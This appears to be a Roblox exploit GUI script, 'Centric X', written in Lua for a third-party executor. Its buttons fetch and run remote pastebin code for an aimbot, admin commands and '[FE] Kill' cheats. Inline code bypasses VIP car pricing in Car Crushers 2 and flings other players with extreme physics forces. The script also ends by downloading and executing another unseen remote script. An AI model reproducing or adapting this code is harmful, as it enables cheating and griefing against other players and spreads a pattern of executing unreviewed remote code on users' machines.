--New Section = 0.082+ xxx.Position
--Warns
warn "DM me if you find a bug (NO SUPPORT FOR OTHER EXPLOITS)"
warn "Discord of Genesis and Centric X: qJUm5N7"
-- INSTANCES
local CentricX = Instance.new("ScreenGui")
local OpenFrame = Instance.new("Frame")
local Open = Instance.new("TextButton")
local Hide = Instance.new("TextButton")
--Loading Frame
local LoadingFrame = Instance.new("Frame")
local Version = Instance.new("TextLabel")
local Centric = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local ToOpenDestroyGUI = Instance.new("TextLabel")
--Main Frame
local MainFrame = Instance.new("Frame")
local RoundedFrame = Instance.new("ImageLabel")
local Frame = Instance.new("ScrollingFrame")
--Scripts A/Z
local AdminCommands = Instance.new("TextButton")
local Aimbot = Instance.new("TextButton")
local Arsenal = Instance.new("TextButton")
local BadBussiness = Instance.new("TextButton")
local CarCrusher = Instance.new("TextButton")
local FEKILL = Instance.new("TextButton")
local FEKILLInvisible = Instance.new("TextButton")
--Working
local Working1 = Instance.new("TextLabel")
local Working2 = Instance.new("TextLabel")
local Working3 = Instance.new("TextLabel")
local WorkingBadBussiness = Instance.new("TextLabel")
local Workingcar = Instance.new("TextLabel")
local Working4 = Instance.new("TextLabel")
local Working5 = Instance.new("TextLabel")
--Destroy GUI
local DestroyGUI = Instance.new("TextButton")
--
--
-- PROPERTIES
--
--
CentricX.Name = "Centric X"
CentricX.Parent = game.CoreGui
CentricX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

--
--
-- LOADING FRAME
--
--
LoadingFrame.Name = "Loading Frame"
LoadingFrame.Parent = CentricX
LoadingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)

Version.Name = "Version"
Version.Parent = LoadingFrame
Version.BackgroundColor3 = Color3.new(1, 1, 1)
Version.BackgroundTransparency = 1
Version.BorderSizePixel = 0
Version.Position = UDim2.new(0.453324966, 0, 0.669510841, 0)
Version.Size = UDim2.new(0, 200, 0, 50)
Version.Font = Enum.Font.SourceSansBold
Version.Text = "Version: 0.0.9 (Pre-Beta)"
Version.TextColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
Version.TextScaled = true
Version.TextSize = 14
Version.TextWrapped = true

Centric.Name = "Centric"
Centric.Parent = LoadingFrame
Centric.BackgroundColor3 = Color3.new(1, 1, 1)
Centric.BorderSizePixel = 0
Centric.Position = UDim2.new(0.429779918, 0, 0.442689369, 0)
Centric.Size = UDim2.new(0, 290, 0, 118)
Centric.Font = Enum.Font.SourceSansBold
Centric.Text = "Centric X"
Centric.TextColor3 = Color3.new(1, 0.666667, 0)
Centric.TextScaled = true
Centric.TextSize = 14
Centric.TextWrapped = true

ImageLabel.Parent = LoadingFrame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.48, 0, 0.0340000018, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 100)
ImageLabel.Image = "rbxassetid://29563813"

ToOpenDestroyGUI.Name = "To Open/Destroy GUI"
ToOpenDestroyGUI.Parent = LoadingFrame
ToOpenDestroyGUI.BackgroundColor3 = Color3.new(1, 1, 1)
ToOpenDestroyGUI.BackgroundTransparency = 1
ToOpenDestroyGUI.BorderSizePixel = 0
ToOpenDestroyGUI.Position = UDim2.new(0.453324966, 0, 0.13, 0)
ToOpenDestroyGUI.Size = UDim2.new(0, 200, 0, 50)
ToOpenDestroyGUI.Font = Enum.Font.SourceSansBold
ToOpenDestroyGUI.Text = "You can Open/Hide GUI at the top c:"
ToOpenDestroyGUI.TextColor3 = Color3.new(0, 0, 0)
ToOpenDestroyGUI.TextSize = 18
ToOpenDestroyGUI.TextWrapped = true
--
--
--OPEN/HIDE FRAME
--
--
--Open Frame
OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = CentricX
OpenFrame.BackgroundColor3 = Color3.new(1, 1, 1)
OpenFrame.BackgroundTransparency = 1
OpenFrame.BorderSizePixel = 0
OpenFrame.Position = UDim2.new(0.474550871, 0, 0, 0)
OpenFrame.Size = UDim2.new(0, 100, 0, 22)
OpenFrame.Visible = false
	
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Open.BorderColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Open.BorderSizePixel = 0
Open.Size = UDim2.new(0, 100, 0, 22)
Open.Font = Enum.Font.SourceSansBold
Open.Text = "Open"
Open.TextColor3 = Color3.new(1, 1, 1)
Open.TextSize = 15
Open.TextWrapped = true
Open.Visible = false
Open.MouseButton1Down:connect(function()
		MainFrame.Visible = true
		Open.Visible = false
		Hide.Visible = true
		end)
Hide.Parent = OpenFrame
Hide.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Hide.BorderColor3 = Color3.new(0.137255, 0.137255, 0.137255)
Hide.BorderSizePixel = 0
Hide.Size = UDim2.new(0, 100, 0, 22)
Hide.Font = Enum.Font.SourceSansBold
Hide.Text = "Hide"
Hide.TextColor3 = Color3.new(1, 1, 1)
Hide.TextSize = 15
Hide.TextWrapped = true
Hide.MouseButton1Down:connect(function()
		MainFrame.Visible = false
		Open.Visible = true
		Hide.Visible = false
		end)
--
--
--MAIN FRAME
--
--

MainFrame.Name = "MainFrame"
MainFrame.Parent = CentricX
MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainFrame.BackgroundTransparency = 1
MainFrame.BorderSizePixel = 0
MainFrame.Size = UDim2.new(0, 100, 0, 100)
MainFrame.Visible = false
MainFrame.Draggable = true

RoundedFrame.Name = "Rounded Frame"
RoundedFrame.Parent = MainFrame
RoundedFrame.BackgroundColor3 = Color3.new(1, 1, 1)
RoundedFrame.BackgroundTransparency = 1
RoundedFrame.Position = UDim2.new(3.25284433, -12, 2.37740612, -12)
RoundedFrame.Size = UDim2.new(0, 356, 0, 189)
RoundedFrame.Image = "rbxassetid://3570695787"
RoundedFrame.ImageColor3 = Color3.new(0.317647, 0.317647, 0.317647)
RoundedFrame.ScaleType = Enum.ScaleType.Slice
RoundedFrame.SliceScale = 0.13
RoundedFrame.SliceCenter = Rect.new(100, 100, 100, 100)
RoundedFrame.Draggable = true

Frame.Name = "Frame"
Frame.Parent = RoundedFrame
Frame.BackgroundColor3 = Color3.new(0.317647, 0.317647, 0.317647)
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, -0.00408112071, 0)
Frame.Size = UDim2.new(0, 355, 0, 189)
Frame.ScrollBarThickness = 10
Frame.VerticalScrollBarInset = Enum.ScrollBarInset.Always
Frame.CanvasSize = UDim2.new(0, 0, 4, 0)
Frame.Draggable = true

--
--
-- Admin Commands
--
--
AdminCommands.Name = "Admin Commands"
AdminCommands.Parent = Frame
AdminCommands.BackgroundColor3 = Color3.new(1, 1, 1)
AdminCommands.BorderSizePixel = 0
AdminCommands.Position = UDim2.new(0.025, 0, 0.014, 0)
AdminCommands.Size = UDim2.new(0, 200, 0, 50)
AdminCommands.Font = Enum.Font.SourceSansBold
AdminCommands.Text = "Admin Commands"
AdminCommands.TextColor3 = Color3.new(0, 0, 0)
AdminCommands.TextScaled = true
AdminCommands.TextSize = 14
AdminCommands.TextWrapped = true
AdminCommands.MouseButton1Down:connect(function()	
    loadstring(game:HttpGet(('https://pastebin.com/raw/tzTXmYf2'),true))()	
end)
AdminCommands.MouseButton1Down:connect(function()	
	loadstring(game:HttpGet("https://pastebin.com/raw/5dBRaQxm",true))()
end)
Working1.Name = "Working1"
Working1.Parent = AdminCommands
Working1.BackgroundColor3 = Color3.new(1, 1, 1)
Working1.BackgroundTransparency = 1
Working1.BorderSizePixel = 0	
Working1.Position = UDim2.new(1.06, 0, 0, 0)
Working1.Size = UDim2.new(0, 114, 0, 50)
Working1.Font = Enum.Font.SourceSansBold
Working1.Text = "Working ✔"
Working1.TextColor3 = Color3.new(0.333333, 1, 0)
Working1.TextScaled = true
Working1.TextSize = 14
Working1.TextWrapped = true
--
--
-- Aimbot
--
--
Aimbot.Name = "Aimbot"
Aimbot.Parent = Frame
Aimbot.BackgroundColor3 = Color3.new(1, 1, 1)
Aimbot.BorderSizePixel = 0
Aimbot.Position = UDim2.new(0.025, 0, 0.095, 0)
Aimbot.Size = UDim2.new(0, 200, 0, 50)
Aimbot.Font = Enum.Font.SourceSansBold
Aimbot.Text = "Aimbot"
Aimbot.TextColor3 = Color3.new(0, 0, 0)
Aimbot.TextSize = 32
Aimbot.TextWrapped = true
Aimbot.MouseButton1Down:connect(function()
    loadstring(game:HttpGet('https://pastebin.com/raw/jpqVHRa3', true))()
end)

Working2.Name = "Working2"
Working2.Parent = Aimbot
Working2.BackgroundColor3 = Color3.new(1, 1, 1)
Working2.BackgroundTransparency = 1
Working2.BorderSizePixel = 0
Working2.Position = UDim2.new(1.06, 0, 0, 0)
Working2.Size = UDim2.new(0, 114, 0, 50)
Working2.Font = Enum.Font.SourceSansBold
Working2.Text = "Working ✔"
Working2.TextColor3 = Color3.new(0.333333, 1, 0)
Working2.TextScaled = true
Working2.TextSize = 14
Working2.TextWrapped = true
--
--
--
--
--
Arsenal.Name = "Arsenal"
Arsenal.Parent = Frame
Arsenal.BackgroundColor3 = Color3.new(1, 1, 1)
Arsenal.BorderSizePixel = 0
Arsenal.Position = UDim2.new(0.025, 0, 0.177, 0)
Arsenal.Size = UDim2.new(0, 200, 0, 50)
Arsenal.Font = Enum.Font.SourceSansBold
Arsenal.Text = "Arsenal"
Arsenal.TextColor3 = Color3.new(0, 0, 0)
Arsenal.TextSize = 32
Arsenal.TextWrapped = true
Arsenal.MouseButton1Down:connect(function()
    loadstring(game:HttpGet('https://pastebin.com/raw/T3fzg7tm', true))()
end)
Arsenal.MouseButton1Down:connect(function()
	
end)
Working3.Name = "Working3"
Working3.Parent = Arsenal
Working3.BackgroundColor3 = Color3.new(1, 1, 1)
Working3.BackgroundTransparency = 1
Working3.BorderSizePixel = 0
Working3.Position = UDim2.new(1.06, 0, 0, 0)
Working3.Size = UDim2.new(0, 114, 0, 50)
Working3.Font = Enum.Font.SourceSansBold
Working3.Text = "Working ✔"
Working3.TextColor3 = Color3.new(0.333333, 1, 0)
Working3.TextScaled = true
Working3.TextSize = 14
Working3.TextWrapped = true
--
--
-- Bad Bussiness
--
--
BadBussiness.Name = "Bad Bussiness"
BadBussiness.Parent = Frame
BadBussiness.BackgroundColor3 = Color3.new(1, 1, 1)
BadBussiness.BorderSizePixel = 0
BadBussiness.Position = UDim2.new(0.025, 0, 0.341, 0)
BadBussiness.Size = UDim2.new(0, 200, 0, 50)
BadBussiness.Font = Enum.Font.SourceSansBold
BadBussiness.Text = "Bad Bussiness"
BadBussiness.TextColor3 = Color3.new(0, 0, 0)
BadBussiness.TextSize = 32
BadBussiness.TextWrapped = true
BadBussiness.MouseButton1Down:connect(function()
	
end)

WorkingBadBussiness.Name = "WorkingBadBussiness"
WorkingBadBussiness.Parent = BadBussiness
WorkingBadBussiness.BackgroundColor3 = Color3.new(1, 1, 1)
WorkingBadBussiness.BackgroundTransparency = 1
WorkingBadBussiness.BorderSizePixel = 0
WorkingBadBussiness.Position = UDim2.new(1.06, 0, 0, 0)
WorkingBadBussiness.Size = UDim2.new(0, 114, 0, 50)
WorkingBadBussiness.Font = Enum.Font.SourceSansBold
WorkingBadBussiness.Text = "Working ✔"
WorkingBadBussiness.TextColor3 = Color3.new(0.333333, 1, 0)
WorkingBadBussiness.TextScaled = true
WorkingBadBussiness.TextSize = 14
WorkingBadBussiness.TextWrapped = true
--
--
-- Car Crushers2
--
--
CarCrusher.Name = "CarCrusher"
CarCrusher.Parent = Frame
CarCrusher.BackgroundColor3 = Color3.new(1, 1, 1)
CarCrusher.BorderSizePixel = 0
CarCrusher.Position = UDim2.new(0.025, 0, 0.259, 0)
CarCrusher.Size = UDim2.new(0, 200, 0, 50)
CarCrusher.Font = Enum.Font.SourceSansBold
CarCrusher.Text = "Car Crusher 2 (AutoFarm)"
CarCrusher.TextColor3 = Color3.new(0, 0, 0)
CarCrusher.TextSize = 32
CarCrusher.TextWrapped = true
CarCrusher.MouseButton1Down:connect(function()
	local info = game.ReplicatedStorage.VehicleInformation
if not game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 2465866,2465906,5157513,2629753) then
for i, v in pairs(info:GetChildren()) do
    if v:findFirstChild("VipOnly") then
    if v:findFirstChild("Price") then
   if v.VipOnly.Value then
v.Price.Value = 0
   end
    end

local info = game.ReplicatedStorage.VehicleInformation
if not game.Players.LocalPlayer:IsInGroup(2726951) then
for i, v in pairs(info:GetChildren()) do
if v.GroupOnly.Value then
    if v:findFirstChild("VipOnly") then
v.Price.Value = 0
end
end
end
end
end
end
end

workspace["All crushers"]["Volcano Pit"].Lava.Size = Vector3.new(100,100,100)
workspace["All crushers"]["Volcano Pit"].Lava.Transparency = 1
--workspace["All crushers"]["Volcano Pit"].PhysicsBump.Size = Vector3.new(100,100,100)
--workspace["All crushers"]["Volcano Pit"].PhysicsBump.Transparency = 1


while true do
local info = game.ReplicatedStorage.VehicleInformation
local plr = game.Players.LocalPlayer
local money = plr.Money.Value

local bestName, bestPrice = nil, 0
for i, car in pairs(info:GetChildren()) do
    local name = car.Name
    local price = car.Price.Value-5
    if price > bestPrice and price <= money then
        bestName, bestPrice = name, price
    end
end


game.ReplicatedStorage.rF['LoadSaveCustoms']:InvokeServer("Save","Institutional white","Platinum",bestName)
wait(0.25)
game:GetService("ReplicatedStorage").rF.SpawnVehicle:InvokeServer(bestName)

for i=1,10 do
if game.Workspace.CarCollection:findFirstChild(game.Players.LocalPlayer.Name) then
if game.Workspace.CarCollection[game.Players.LocalPlayer.Name].Car.PrimaryPart ~= nil then
game.Workspace.CarCollection[game.Players.LocalPlayer.Name].Car:SetPrimaryPartCFrame(CFrame.new(130.613281, -325.787872, -439.587036, -0.0313572325, 0.984323323, -0.173563436, -7.01718506e-09, 0.173648819, 0.984807611, 0.999508262, 0.0308808442, -0.00544513995))
wait()
end
end
end
for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part" then
if v.Size == Vector3.new(2.47, 2.2, 1.21)
or v.Size == Vector3.new(1, 3.125, 1) then
v.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position)
end
end
end
wait()
end
end)

Workingcar.Name = "Workingcar"
Workingcar.Parent = CarCrusher
Workingcar.BackgroundColor3 = Color3.new(1, 1, 1)
Workingcar.BackgroundTransparency = 1
Workingcar.BorderSizePixel = 0
Workingcar.Position = UDim2.new(1.06, 0, 0, 0)
Workingcar.Size = UDim2.new(0, 114, 0, 50)
Workingcar.Font = Enum.Font.SourceSansBold
Workingcar.Text = "Patched ✘"
Workingcar.TextColor3 = Color3.new(255, 0, 0)
Workingcar.TextScaled = true
Workingcar.TextSize = 14
Workingcar.TextWrapped = true
--
--
-- FE KILL
--
--
FEKILL.Name = "FE KILL"
FEKILL.Parent = Frame
FEKILL.BackgroundColor3 = Color3.new(1, 1, 1)
FEKILL.BorderSizePixel = 0
FEKILL.Position = UDim2.new(0.0249208622, 0, 0.423, 0)
FEKILL.Size = UDim2.new(0, 200, 0, 50)
FEKILL.Font = Enum.Font.SourceSansBold
FEKILL.Text = "[FE] Kill"
FEKILL.TextColor3 = Color3.new(0, 0, 0)
FEKILL.TextSize = 32
FEKILL.TextWrapped = true
FEKILL.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/rmqYLJ9f', true))()
end)
FEKILL.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/8ifduJfr', true))()
end)

Working4.Name = "Working4"
Working4.Parent = FEKILL
Working4.BackgroundColor3 = Color3.new(1, 1, 1)
Working4.BackgroundTransparency = 1
Working4.BorderSizePixel = 0
Working4.Position = UDim2.new(1.06, 0, 0, 0)
Working4.Size = UDim2.new(0, 114, 0, 50)
Working4.Font = Enum.Font.SourceSansBold
Working4.Text = "Semi-Working"
Working4.TextColor3 = Color3.new(1, 0.333333, 0)
Working4.TextScaled = true
Working4.TextSize = 14
Working4.TextWrapped = true
--
--
-- FE Fling Invisible
--
--
FEKILLInvisible.Name = "FEKillInvisible"
FEKILLInvisible.Parent = Frame
FEKILLInvisible.BackgroundColor3 = Color3.new(1, 1, 1)
FEKILLInvisible.BorderSizePixel = 0
FEKILLInvisible.Position = UDim2.new(0.024908622, 0, 0.505, 0)
FEKILLInvisible.Size = UDim2.new(0, 200, 0, 50)
FEKILLInvisible.Font = Enum.Font.SourceSansBold
FEKILLInvisible.Text = "[FE] Invisible Kill"
FEKILLInvisible.TextColor3 = Color3.new(0, 0, 0)
FEKILLInvisible.TextSize = 32
FEKILLInvisible.TextWrapped = true
FEKILLInvisible.MouseButton1Down:connect(function()
	
spawn(function()
local message = Instance.new("Message",workspace)
message.Text = "Loaded press z to execute inviseble , press x to respawn)"
wait(0.5)
message:Destroy()
end)








local mouse = game.Players.LocalPlayer:GetMouse()

local groot = nil

mouse.KeyDown:connect(function(k)
	
	if k == "z" then
		
		
		
spawn(function()
local message = Instance.new("Message",workspace)
message.Text = "Fe Invisible Fling By Diemiers#4209 Loaded (wait 11 seconds to load)"
wait(11)
message:Destroy()
end)


local ch = game.Players.LocalPlayer.Character
local prt=Instance.new("Model", workspace)
local z1 =  Instance.new("Part", prt)
z1.Name="Torso"
z1.CanCollide = false
z1.Anchored = true
local z2  =Instance.new("Part", prt)
z2.Name="Head"
z2.Anchored = true
z2.CanCollide = false
local z3 =Instance.new("Humanoid", prt)
z3.Name="Humanoid"
z1.Position = Vector3.new(0,9999,0)
z2.Position = Vector3.new(0,9991,0)
 game.Players.LocalPlayer.Character=prt
wait(5)
game.Players.LocalPlayer.Character=ch
wait(6)


local plr = game.Players.LocalPlayer
mouse = plr:GetMouse()

local Hum = Instance.new("Humanoid")
Hum.Parent = game.Players.LocalPlayer.Character


local root =  game.Players.LocalPlayer.Character.HumanoidRootPart


for i,v in pairs(plr.Character:GetChildren()) do
	
	if v ~= root and  v.Name ~= "Humanoid" then
		
		v:Destroy()
		
	end
	
	
end
           
workspace.CurrentCamera.CameraSubject = root

local se = Instance.new("SelectionBox",root)
se.Adornee = root


game:GetService('RunService').Stepped:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
end)
game:GetService('RunService').RenderStepped:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
end)


power = 999999 -- change this to make it more or less powerful

power = power*10

---
wait(.1)
local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(power,0,power)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 





local plr = game.Players.LocalPlayer
local torso = root
local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local maxspeed = 120
local speed = 15


---local bambam = Instance.new("BodyThrust")
---bambam.Parent = torso
--bambam.Force = Vector3.new(9999999,0,9999999)
--bambam.Location = torso.Position


---
groot = root
 
function Fly()
local bg = Instance.new("BodyGyro", torso)
bg.P = 9e4
bg.maxTorque = Vector3.new(0, 0, 0)
bg.cframe = torso.CFrame
local bv = Instance.new("BodyVelocity", torso)
bv.velocity = Vector3.new(0,0,0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
repeat wait()

if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
speed = speed+.2
if speed > maxspeed then
speed = maxspeed
end
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
speed = speed-1
if speed < 0 then
speed = 0
end
end
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
else
bv.velocity = Vector3.new(0,0.1,0)
end

until not flying
ctrl = {f = 0, b = 0, l = 0, r = 0}
lastctrl = {f = 0, b = 0, l = 0, r = 0}
speed = 0
bg:Destroy()
bv:Destroy()

end
mouse.KeyDown:connect(function(key)
if key:lower() == "e" then
if flying then flying = false
else
flying = true
Fly()
end
elseif key:lower() == "w" then
ctrl.f = 1
elseif key:lower() == "s" then
ctrl.b = -1
elseif key:lower() == "a" then
ctrl.l = -1
elseif key:lower() == "d" then
ctrl.r = 1
end
end)
mouse.KeyUp:connect(function(key)
if key:lower() == "w" then
ctrl.f = 0
elseif key:lower() == "s" then
ctrl.b = 0
elseif key:lower() == "a" then
ctrl.l = 0
elseif key:lower() == "d" then
ctrl.r = 0
elseif key:lower() == "r" then

end
end)
Fly()

		
		
	elseif k == "x" then
		
		
		spawn(function()
local message = Instance.new("Message",workspace)
message.Text = "Respawning dont spam"
wait(1)
message:Destroy()
end)
		
		local saved = groot.Position
		
local ch = game.Players.LocalPlayer.Character
local prt=Instance.new("Model", workspace)
local z1 =  Instance.new("Part", prt)
z1.Name="Torso"
z1.CanCollide = false
z1.Anchored = true
local z2  =Instance.new("Part", prt)
z2.Name="Head"
z2.Anchored = true
z2.CanCollide = false
local z3 =Instance.new("Humanoid", prt)
z3.Name="Humanoid"
z1.Position = Vector3.new(0,9999,0)
z2.Position = Vector3.new(0,9991,0)
 game.Players.LocalPlayer.Character=prt
wait(5)
 game.Players.LocalPlayer.Character=ch
local poop = nil
		repeat wait() poop = game.Players.LocalPlayer.Character:FindFirstChild("Head") until poop ~= nil
		wait(1)
		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saved)
		
	end
	
	
end)
end)
Working5.Name = "Working5"
Working5.Parent = FEKILLInvisible
Working5.BackgroundColor3 = Color3.new(1, 1, 1)
Working5.BackgroundTransparency = 1
Working5.BorderSizePixel = 0
Working5.Position = UDim2.new(1.06, 0, 0, 0)
Working5.Size = UDim2.new(0, 114, 0, 50)
Working5.Font = Enum.Font.SourceSansBold
Working5.Text = "Working ✔"
Working5.TextColor3 = Color3.new(0.333333, 1, 0)
Working5.TextScaled = true
Working5.TextSize = 14
Working5.TextWrapped = true
--
--
-- DESTROY GUI
--
--
DestroyGUI.Name = "Destroy GUI"
DestroyGUI.Parent = Frame
DestroyGUI.BackgroundColor3 = Color3.new(1, 1, 1)
DestroyGUI.BorderSizePixel = 0
DestroyGUI.Position = UDim2.new(0.0220917203, 0, 0.925, 0)
DestroyGUI.Size = UDim2.new(0, 200, 0, 50)
DestroyGUI.Font = Enum.Font.SourceSansBold
DestroyGUI.Text = "Destroy GUI"
DestroyGUI.TextColor3 = Color3.new(1, 0, 0)
DestroyGUI.TextSize = 32
DestroyGUI.TextWrapped = true
DestroyGUI.MouseButton1Down:connect(function()
	CentricX:Destroy()
end)
--
--
-- GUI Scripts
--
--
wait(6)
LoadingFrame:Destroy()
wait(0)
OpenFrame.Visible = true
MainFrame.Visible = true
--Notifications
wait(0.3)

game.StarterGui:SetCore("SendNotification", {
    Title = "Centric X 0.0.9(Pre-Beta) Loaded";
    Text = "GUI made by AntCar#3763 (not scripts)";
})
wait(6.5)
game.StarterGui:SetCore("SendNotification", {
    Title = "FPS Lib 1.1";
    Text = "Made by MarioFan835";
})
loadstring(game:HttpGet(('https://pastebin.com/raw/tYeN5pZg'),true))()